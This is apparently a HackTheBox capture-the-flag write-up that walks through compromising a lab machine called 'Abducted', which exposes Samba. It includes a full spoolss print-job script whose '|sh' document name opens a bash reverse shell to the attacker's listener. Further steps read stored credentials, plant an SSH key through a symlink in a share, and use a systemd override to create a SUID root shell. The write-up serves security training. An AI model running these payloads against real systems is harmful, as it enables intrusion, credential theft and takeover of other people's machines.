# HackTheBox: Abducted Write-up

## Enumeration

The initial Nmap scan against the target IP (10.129.244.177) reveals that ports 22 (SSH) and 139/445 (Samba) are open.

```text
nmap -sSVC -A 10.129.244.177
Starting Nmap 7.95 (https://nmap.org)
...
22/tcp open ssh 
OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
139/tcp open netbios-ssn Samba smbd 4
445/tcp open netbios-ssn Samba smbd 4
```

Listing the Samba shares anonymously shows several file shares and a printer.

```text
smbclient -L //10.129.244.177 -N

Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service (Hartley Group Document Services)
```

The `projects` and `transfer` shares reject anonymous access, but the `HP-Reception` share permits guest printing. The server identifies itself as running on a Windows 6.1 platform via SMB negotiation.

## Initial Foothold

A Python script leveraging the `spoolss` service is used to submit a malicious print job to the `HP-Reception` printer, triggering a reverse shell.

```python
#!/usr/bin/env python3
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials

RHOST = "10.129.244.177"
LHOST = "10.10.15.88"
LPORT = 44444

DATA = (
    "setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n"
    % (LHOST, LPORT)
).encode()

lp = LoadParm()
lp.load_default()
creds = Credentials()
creds.guess(lp)
creds.set_anonymous()

iface = spoolss.spoolss(
    r"ncacn_np:%s [\pipe\spoolss]" % RHOST,
    lp,
    creds
)

h = iface.OpenPrinterEx(
    "\\%s\HP-Reception" % RHOST,
    spoolss.DevmodeContainer(),
    0x00000008
)

i1 = spoolss.DocumentInfo1()
i1.document_name = "|sh"
i1.output_file = None
i1.datatype = "RAW"

ctr = spoolss.DocumentInfoCtr()
ctr.level = 1
ctr.info = i1

iface.StartDocPrinter(h, ctr)
iface.StartPagePrinter(h)
iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h)
iface.EndDocPrinter(h)
iface.ClosePrinter(h)
print("[+] job submitted")
```

Once the shell connects as the `nobody` user, checking the `/opt/offsite-backup/rclone.conf` file reveals a stored password for `svc-backup`.

```text
nobody@abducted:/var/spool/samba$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

Using the `rclone reveal` command, the obscured password is decrypted to `iXzvcib3SrpZ`.

## User Ownership

This password is valid for the user `scott`, allowing for a successful SSH login where the user flag can be captured.

```bash
ssh scott@10.129.244.177
# Log in with the revealed password to claim the user flag.
```

## Privilege Escalation: User Marcus

Reviewing the Samba configuration file at `/etc/samba/shares.conf` reveals the settings for the available shares.

```ini
...
[transfer]
comment = Staff file transfer
path = /srv/transfer
valid users = scott
force user = marcus
read only = no
wide links = yes
browseable = yes
```

The `transfer` share contains a misconfiguration: it has `wide links = yes` and `force user = marcus`. This allows for symlink exploitation. An SSH keypair is generated locally, and a symlink named `mh` is created pointing to `/home/marcus`. Using `smbclient`, the new public key is uploaded directly into `marcus`'s `authorized_keys` file.

```bash
scott@abducted:~$ ssh-keygen -t ed25519 -N "" -f /tmp/k
scott@abducted:~$ ln -s /home/marcus /srv/transfer/mh
scott@abducted:~$ smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'
```

With the key in place, SSH access is granted as the user `marcus`.

## Root Ownership

Checking the user ID reveals that `marcus` is a member of the `operators` group. Directory permissions show that the `operators` group has write access to `/etc/systemd/system/smbd.service.d`.

```bash
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d
drwxrws--- 2 root operators 4096 ... /etc/systemd/system/smbd.service.d
```

A systemd service override file (`override.conf`) is created in this directory. It is configured to copy `/bin/bash` to `/tmp/rootbash` and set the SUID bit (`chmod 4755`) right before the `smbd` service starts.

```bash
marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/sh -c 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'
EOF
```

The systemd daemon is reloaded and the `smbd` service is restarted.

```bash
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
```

This successfully generates the SUID bash binary. Executing `/tmp/rootbash -p` grants a root shell, allowing the final root flag to be captured.

```bash
marcus@abducted:~$ ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 1446024 Jun 6 12:56 /tmp/rootbash
marcus@abducted:~$ /tmp/rootbash -p
# Root access obtained.
```
